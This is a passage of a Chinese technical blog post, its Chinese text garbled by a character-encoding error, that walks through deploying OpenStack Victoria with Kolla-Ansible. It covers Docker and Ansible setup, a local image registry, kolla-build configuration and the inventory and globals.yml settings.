http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span></span><br></pre></td></tr></table></figure></li><li><p>é…ç½®å…å¯†ç™»å½•</p><p> æ·»åŠ åŸŸåè§£æ /etc/hosts</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># local</span></span><br><span class="line">10.111.1.125 controller</span><br><span class="line"> </span><br><span class="line"><span class="comment"># openstack</span></span><br><span class="line">10.111.1.250 openstack01</span><br></pre></td></tr></table></figure><p> ç”Ÿæˆå¯†é’¥å¹¶æ‹·è´åˆ°ç›®æ ‡ä¸»æœº</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen</span><br><span class="line">ssh-copy-id -i /home/jck/.ssh/id_rsa.pub op1@openstack01</span><br></pre></td></tr></table></figure></li><li><p>å®‰è£…ä¾èµ–</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ›´æ–°æº</span></span><br><span class="line">sudo apt update</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£… Python æ„å»ºä¾èµ–</span></span><br><span class="line">sudo apt install python3-dev libffi-dev gcc libssl-dev -y</span><br></pre></td></tr></table></figure><p> å®‰è£… <code>venv</code>ï¼Œåˆ›å»ºå¹¶ä½¿ç”¨è™šæ‹Ÿç¯å¢ƒ</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å®‰è£… venv</span></span><br><span class="line">sudo apt install python3-venv -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºè™šæ‹Ÿç¯å¢ƒ</span></span><br><span class="line">mkdir code</span><br><span class="line">python -m venv ~/code</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¿€æ´»è™šæ‹Ÿç¯å¢ƒ</span></span><br><span class="line"><span class="built_in">source</span> ~/code/bin/activate</span><br></pre></td></tr></table></figure></li><li><p>å®‰è£… Kolla-Ansibleï¼ŒæŒ‡å®š Victoria ç‰ˆæœ¬</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å®‰è£… Ansible</span></span><br><span class="line">pip install -U pip</span><br><span class="line">pip install <span class="string">&#x27;ansible&lt;3.0&#x27;</span></span><br><span class="line">pip install kolla-ansible</span><br><span class="line">pip install kolla</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸‹è½½æºç </span></span><br><span class="line"><span class="comment">#pip install &#x27;ansible&lt;2.10&#x27;</span></span><br><span class="line"><span class="comment">#git clone https://github.com/openstack/kolla -b stable/victoria</span></span><br><span class="line"><span class="comment">#git clone https://github.com/openstack/kolla-ansible -b stable/victoria</span></span><br><span class="line"><span class="comment"># å®‰è£…</span></span><br><span class="line"><span class="comment">#pip install ./kolla</span></span><br><span class="line"><span class="comment">#pip install ./kolla-ansible</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºç›®å½•</span></span><br><span class="line">sudo mkdir -p /etc/kolla</span><br><span class="line"></span><br><span class="line"><span class="comment"># æƒé™è®¾ç½®</span></span><br><span class="line">sudo chown <span class="variable">$USER</span>:<span class="variable">$USER</span> /etc/kolla</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‹·è´é…ç½®æ–‡ä»¶</span></span><br><span class="line"><span class="comment">#cp -r kolla-ansible/etc/kolla/* /etc/kolla</span></span><br><span class="line"><span class="comment">#cp kolla-ansible/ansible/inventory/* .</span></span><br><span class="line">cp -r /home/jck/code/share/kolla-ansible/etc_examples/kolla/* /etc/kolla</span><br><span class="line">cp /home/jck/code/share/kolla-ansible/ansible/inventory/* .</span><br></pre></td></tr></table></figure></li><li><p>é…ç½® Ansible</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»º</span></span><br><span class="line">sudo mkdir /etc/ansible</span><br><span class="line">sudo vim /etc/ansible/ansible.cfg</span><br></pre></td></tr></table></figure><p> é…ç½®å¦‚ä¸‹</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[defaults]</span><br><span class="line">host_key_checking&#x3D;False</span><br><span class="line">pipelining&#x3D;True</span><br><span class="line">forks&#x3D;100</span><br></pre></td></tr></table></figure></li><li><p>å®‰è£… Docker å’Œ docker-compose</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># docker</span></span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y \</span><br><span class="line">    apt-transport-https \</span><br><span class="line">    ca-certificates \</span><br><span class="line">    curl \</span><br><span class="line">    gnupg \</span><br><span class="line">    lsb-release</span><br><span class="line"> </span><br><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg</span><br><span class="line"> </span><br><span class="line"><span class="built_in">echo</span> \</span><br><span class="line">  <span class="string">&quot;deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \</span></span><br><span class="line"><span class="string">  <span class="subst">$(lsb_release -cs)</span> stable&quot;</span> | sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br><span class="line">   </span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y docker-ce docker-ce-cli containerd.io</span><br><span class="line"> </span><br><span class="line"><span class="comment"># ç”¨æˆ·ç»„è®¾ç½®</span></span><br><span class="line">sudo groupadd docker</span><br><span class="line">sudo usermod -aG docker <span class="variable">$USER</span></span><br><span class="line">newgrp docker</span><br><span class="line"> </span><br><span class="line"><span class="comment"># å¼€æœºå¯åŠ¨</span></span><br><span class="line">sudo systemctl <span class="built_in">enable</span> docker.service</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> containerd.service</span><br><span class="line"> </span><br><span class="line"><span class="comment"># docker-compose</span></span><br><span class="line">sudo curl -L <span class="string">&quot;https://github.com/docker/compose/releases/download/1.29.2/docker-compose-<span class="subst">$(uname -s)</span>-<span class="subst">$(uname -m)</span>&quot;</span> -o /usr/<span class="built_in">local</span>/bin/docker-compose</span><br><span class="line"> </span><br><span class="line">sudo chmod +x /usr/<span class="built_in">local</span>/bin/docker-compose</span><br></pre></td></tr></table></figure><p> åˆ›å»ºé…ç½®æ–‡ä»¶ /etc/docker/daemon.jsonï¼Œè®¾ç½®å›½å†…é•œåƒæº</p> <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;registry-mirrors&quot;:</span> [</span><br><span class="line">        <span class="string">&quot;http://hub-mirror.c.163.com&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;insecure-registries&quot;:</span> [</span><br><span class="line">        <span class="string">&quot;10.111.1.125:5000&quot;</span> <span class="comment"># æŒ‡å‘ä¹‹åéƒ¨ç½²çš„æœ¬åœ°é•œåƒä»“åº“</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;iptables&quot;:</span> <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">&quot;log-opts&quot;:</span> &#123;</span><br><span class="line">        <span class="attr">&quot;max-file&quot;:</span> <span class="string">&quot;5&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;max-size&quot;:</span> <span class="string">&quot;50m&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> é‡å¯ docker æœåŠ¡</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service docker restart</span><br></pre></td></tr></table></figure></li></ol><h2 id="registry-registry-ui"><a href="#registry-registry-ui" class="headerlink" title="registry + registry-ui"></a>registry + registry-ui</h2><p>ç›´æ¥ä½¿ç”¨ <a href="https://github.com/Joxit/docker-registry-ui">Joxit/docker-registry-ui</a> ä»“åº“çš„ç¤ºä¾‹é…ç½®ï¼Œåœ¨æœ¬åœ°éƒ¨ç½² registry å’Œ registry-ui</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å…‹éš†ä»“åº“</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/Joxit/docker-registry-ui.git</span><br><span class="line"><span class="built_in">cd</span> docker-registry-ui/examples/ui-as-standalone</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®æ”¹é…ç½® localhost -&gt; 10.111.1.125</span></span><br><span class="line">vim simple.yml</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®æ”¹é…ç½® Access-Control-Allow-Origin: [&#x27;*&#x27;]</span></span><br><span class="line">vim registry-config/simple.yml</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿è¡Œå®¹å™¨</span></span><br><span class="line">docker-compose -f simple.yml up -d</span><br></pre></td></tr></table></figure><p><em>PSï¼šç”¨å®Œä¹‹åæ‰å‘ç°å®Œå…¨å¯ä»¥æ­ä¸ª harbor ç”¨â€¦</em></p><p><img src="https://i.loli.net/2021/08/31/VrvtLg7TQ1YxwcH.png"></p><h2 id="æ„å»ºåŸºç¡€é•œåƒ"><a href="#æ„å»ºåŸºç¡€é•œåƒ" class="headerlink" title="æ„å»ºåŸºç¡€é•œåƒ"></a>æ„å»ºåŸºç¡€é•œåƒ</h2><p>ç¼–å†™ ubuntu 20.04 åŸºç¡€é•œåƒ Dockerfileï¼Œæ›¿æ¢ source æºå’Œ pip æºï¼Œ</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> pip.conf /etc/pip.conf</span></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> sources.list /etc/apt/sources.list</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt-get update</span></span><br></pre></td></tr></table></figure><p>æ›¿æ¢ pip æºï¼ˆpip.confï¼‰</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[global]</span></span><br><span class="line"><span class="attr">timeout</span> = <span class="number">6000</span></span><br><span class="line"><span class="attr">index-url</span> = http://mirrors.aliyun.com/pypi/simple/</span><br><span class="line"><span class="attr">trusted-host</span> = mirrors.aliyun.com</span><br></pre></td></tr></table></figure><p>æ›¿æ¢ sources.listï¼Œæ³¨æ„è¿™é‡Œå†™çš„æ˜¯ <code>http</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># é»˜è®¤æ³¨é‡Šäº†æºç é•œåƒä»¥æé«˜ apt update é€Ÿåº¦ï¼Œå¦‚æœ‰éœ€è¦å¯è‡ªè¡Œå–æ¶ˆæ³¨é‡Š</span></span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span></span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span></span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span></span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span></span><br></pre></td></tr></table></figure><p>æ„å»ºé•œåƒå¹¶å‘å¸ƒåˆ° dockerhub</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ„å»ºé•œåƒï¼Œ--network=host é¿å…åŸŸåè§£æé”™è¯¯</span></span><br><span class="line">docker build --network=host -t lycanj/kolla_ansible-base_image-ubuntu:20.04 .</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç™»å½• dockerhub</span></span><br><span class="line">docker login</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸Šä¼ åˆ° dockerhub</span></span><br><span class="line">docker push lycanj/kolla_ansible-base_image-ubuntu:20.04</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/31/4KVtSW6Bx5NYaeh.jpg"></p><h2 id="æ„å»ºç»„ä»¶é•œåƒ"><a href="#æ„å»ºç»„ä»¶é•œåƒ" class="headerlink" title="æ„å»ºç»„ä»¶é•œåƒ"></a>æ„å»ºç»„ä»¶é•œåƒ</h2><p>ä¸‹è½½ Victoria ç»„ä»¶æºç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/keystone.git --branch stable/victoria --single-branch</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/glance.git --branch stable/victoria --single-branch</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/nova.git --branch stable/victoria --single-branch</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/neutron.git --branch stable/victoria --single-branch</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/heat.git --branch stable/victoria --single-branch</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ kolla-build ç”Ÿæˆé•œåƒï¼Œå¹¶ push åˆ°æœ¬åœ°ä»“åº“ã€‚ä¸‹è½½ kolla ä»“åº“å¹¶ä½¿ç”¨ tox ç”Ÿæˆé…ç½®æ–‡ä»¶ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å…‹éš†ä»“åº“</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/kolla.git --branch stable/victoria</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£… toxï¼ˆè™šæ‹Ÿç¯å¢ƒä¸­ï¼‰</span></span><br><span class="line">pip install tox</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”Ÿæˆé…ç½®æ–‡ä»¶</span></span><br><span class="line"><span class="built_in">cd</span> kolla</span><br><span class="line">tox -e genconfig</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®æ”¹é…ç½®æ–‡ä»¶</span></span><br><span class="line">vim kolla/etc/kolla/kolla-build.conf</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p><ul><li>æŒ‡å®šåŸºç¡€ ubuntu é•œåƒ</li><li>ä½¿ç”¨æºç æ„å»ºé•œåƒ</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[DEFAULT]</span></span><br><span class="line"><span class="comment"># The distro type of the base image. (string value)</span></span><br><span class="line"><span class="comment"># Possible values:</span></span><br><span class="line"><span class="comment"># centos - &lt;No description provided&gt;</span></span><br><span class="line"><span class="comment"># rhel - &lt;No description provided&gt;</span></span><br><span class="line"><span class="comment"># ubuntu - &lt;No description provided&gt;</span></span><br><span class="line"><span class="comment"># debian - &lt;No description provided&gt;</span></span><br><span class="line"><span class="attr">base</span> = ubuntu</span><br><span class="line"></span><br><span class="line"><span class="comment"># The base image name. Default is the same with base. (string value)</span></span><br><span class="line"><span class="attr">base_image</span> = lycanj/kolla_ansible-base_image-ubuntu</span><br><span class="line"></span><br><span class="line"><span class="comment"># The Docker namespace name (string value)</span></span><br><span class="line"><span class="comment">#namespace = kolla</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The network mode for Docker build. Example: host (string value)</span></span><br><span class="line"><span class="attr">network_mode</span> = host</span><br><span class="line"></span><br><span class="line"><span class="comment"># Push images after building (boolean value)</span></span><br><span class="line"><span class="attr">push</span> = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The docker registry host. The default registry host is Docker Hub</span></span><br><span class="line"><span class="comment"># (string value)</span></span><br><span class="line"><span class="attr">registry</span> = <span class="number">10.111</span>.<span class="number">1.125</span>:<span class="number">5000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The method of the OpenStack install. (string value)</span></span><br><span class="line"><span class="comment"># Possible values:</span></span><br><span class="line"><span class="comment"># binary - &lt;No description provided&gt;</span></span><br><span class="line"><span class="comment"># source - &lt;No description provided&gt;</span></span><br><span class="line"><span class="comment"># rdo - &lt;No description provided&gt;</span></span><br><span class="line"><span class="comment"># rhos - &lt;No description provided&gt;</span></span><br><span class="line"><span class="attr">install_type</span> = source</span><br><span class="line"></span><br><span class="line"><span class="comment"># The Docker tag (string value)</span></span><br><span class="line"><span class="attr">tag</span> = victoria</span><br><span class="line"></span><br><span class="line"><span class="comment"># OpenStack release for building kolla-toolbox (string value)</span></span><br><span class="line"><span class="attr">openstack_release</span> = victoria</span><br><span class="line"></span><br><span class="line"><span class="comment"># Branch for source images (string value)</span></span><br><span class="line"><span class="attr">openstack_branch</span> = victoria-stable</span><br><span class="line"></span><br><span class="line"><span class="comment"># Content of the maintainer label (string value)</span></span><br><span class="line"><span class="comment">#maintainer = Kolla Project (https://launchpad.net/kolla)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Path to custom sources.list (string value)</span></span><br><span class="line"><span class="comment">#apt_sources_list = &lt;None&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="section">[keystone-base]</span></span><br><span class="line"><span class="comment"># Source location type (string value)</span></span><br><span class="line"><span class="comment"># Possible values:</span></span><br><span class="line"><span class="comment"># local - &lt;No description provided&gt;</span></span><br><span class="line"><span class="comment"># git - &lt;No description provided&gt;</span></span><br><span class="line"><span class="comment"># url - &lt;No description provided&gt;</span></span><br><span class="line"><span class="attr">type</span> = local</span><br><span class="line"></span><br><span class="line"><span class="comment"># The location for source install (string value)</span></span><br><span class="line"><span class="attr">location</span> = /home/jck/keystone</span><br><span class="line"></span><br><span class="line"><span class="section">[glance-base]</span></span><br><span class="line"><span class="attr">type</span> = local</span><br><span class="line"><span class="attr">location</span> = /home/jck/glance</span><br><span class="line"></span><br><span class="line"><span class="section">[nova-base]</span></span><br><span class="line"><span class="attr">type</span> = local</span><br><span class="line"><span class="attr">location</span> = /home/jck/nova</span><br><span class="line"></span><br><span class="line"><span class="section">[neutron-base]</span></span><br><span class="line"><span class="attr">type</span> = local</span><br><span class="line"><span class="attr">location</span> = /home/jck/neutron</span><br><span class="line"></span><br><span class="line"><span class="section">[heat-base]</span></span><br><span class="line"><span class="attr">type</span> = local</span><br><span class="line"><span class="attr">location</span> = /home/jck/heat</span><br></pre></td></tr></table></figure><p>ç„¶åæŒ‡å®šè¯¥é…ç½®æ–‡ä»¶æ„å»ºé•œåƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kolla-build --config-file ~/kolla/etc/kolla/kolla-build.conf</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/31/XHqEmYQgOL2lBU7.png"></p><h2 id="éƒ¨ç½²-OpenStack"><a href="#éƒ¨ç½²-OpenStack" class="headerlink" title="éƒ¨ç½² OpenStack"></a>éƒ¨ç½² OpenStack</h2><p>ä¿®æ”¹ multinode é…ç½®ï¼Œç¼–è¾‘æœ€å‰é¢çš„å‡ é¡¹ï¼Œå°†ç›®æ ‡ä¸»æœºè®¾ç½®ä¸º <code>openstack01</code></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[control]</span></span><br><span class="line">openstack01       ansible_user=op1</span><br><span class="line"></span><br><span class="line"><span class="section">[network]</span></span><br><span class="line">openstack01       ansible_user=op1</span><br><span class="line"></span><br><span class="line"><span class="section">[compute]</span></span><br><span class="line">openstack01       ansible_user=op1</span><br><span class="line"></span><br><span class="line"><span class="section">[monitoring]</span></span><br><span class="line">openstack01       ansible_user=op1</span><br><span class="line"></span><br><span class="line"><span class="section">[storage]</span></span><br><span class="line">openstack01       ansible_user=op1</span><br><span class="line"></span><br><span class="line"><span class="section">[deployment]</span></span><br><span class="line">localhost       ansible_connection=local</span><br></pre></td></tr></table></figure><p>æµ‹è¯•æ˜¯å¦å¯è¾¾</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible -i ~/multinode all -m ping</span><br></pre></td></tr></table></figure><p>å‚ç…§åŸå§‹çš„é…ç½®ç¼–å†™ç²¾ç®€é…ç½®ï¼ˆåªè®¾ç½®ç”¨åˆ°çš„é€‰é¡¹ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ç”Ÿæˆçš„ç¤ºä¾‹é…ç½®æ–‡ä»¶</span></span><br><span class="line">/etc/kolla/globals.yml</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºç²¾ç®€é…ç½®æ–‡ä»¶</span></span><br><span class="line">vim ~/globals.yml </span><br></pre></td></tr></table></figure><p>å†…å®¹å¦‚ä¸‹ï¼š</p><ul><li>æŒ‡å®šä½¿ç”¨æºç æ„å»ºçš„é•œåƒ <code>openstack_tag=victoria</code></li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Valid options are [&#x27;centos&#x27;, &#x27;debian&#x27;, &#x27;rhel&#x27;, &#x27;ubuntu&#x27;]</span></span><br><span class="line">kolla_base_distro: &quot;ubuntu&quot;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Valid options are [ binary, source ]</span></span><br><span class="line">kolla_install_type: &quot;source&quot;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Do not override this unless you know what you are doing.</span></span><br><span class="line">openstack_release: &quot;victoria&quot;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Docker image tag used by default.</span></span><br><span class="line">openstack_tag: &quot;victoria&quot;</span><br><span class="line"></span><br><span class="line"><span class="comment"># This should be a VIP, an unused IP on your network that will float between</span></span><br><span class="line"><span class="comment"># the hosts running keepalived for high-availability. If you want to run an</span></span><br><span class="line"><span class="comment"># All-In-One without haproxy and keepalived, you can set enable_haproxy to no</span></span><br><span class="line"><span class="comment"># in &quot;OpenStack options&quot; section, and set this value to the IP of your</span></span><br><span class="line"><span class="comment"># &#x27;network_interface&#x27; as set in the Networking section below.</span></span><br><span class="line">kolla_internal_vip_address: &quot;10.111.1.251&quot; # å’Œ network_interface åŒç½‘æ®µ</span><br><span class="line"></span><br><span class="line"><span class="comment"># Custom docker registry settings:</span></span><br><span class="line">docker_registry: 10.111.1.125:5000</span><br><span class="line"></span><br><span class="line"><span class="comment"># Namespace of images:</span></span><br><span class="line"><span class="comment">#docker_namespace: &quot;kolla&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 